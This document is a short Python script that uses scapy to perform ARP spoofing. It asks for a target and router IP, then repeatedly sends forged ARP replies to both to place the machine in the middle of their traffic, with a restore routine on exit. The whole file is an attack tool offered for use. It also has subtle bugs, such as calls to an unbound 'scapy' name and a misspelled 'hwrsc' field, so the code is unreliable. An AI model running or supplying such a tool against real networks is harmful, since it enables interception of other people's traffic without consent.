"""#!/usr/bin/env python"""


###Allow for packet flowing before usage
from scapy.all import *
from scapy.all import send, ARP, Ether,srp
import time
import uuid


def get_MAC(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list= srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(targetIP,spoof_IP):
    targetMAC = get_MAC(targetIP)
    packet = scapy.ARP(op=2,pdst=targetIP, hwdst=targetMAC, psrc=spoof_IP)
    scapy.send(packet, verbose=False)

def restore(destination_IP, source_IP):
    destination_MAC=get_MAC(destination_IP)
    source_MAC=get_MAC(source_IP)
    packet=ARP(op=2, pdst=destination_IP,hwdst=destination_MAC, psrc=source_IP,hwrsc=source_MAC)
    send(packet,count=4,verbose=False)
    
if __name__=="__main__":
    try:
        targetIP = input("What is the target's IP address?")
        routerIP = input("What is the router IP?")
        
        

        count = 0
        while True:
            
            spoof(targetIP,routerIP)
            spoof(routerIP,targetIP)
            count+=2
            print("\rSent " + str(count) + " packets", end=""),
            time.sleep(2)
    except KeyboardInterrupt:
        restore(targetIP,routerIP)
        print("Bye, see you again")
        
    
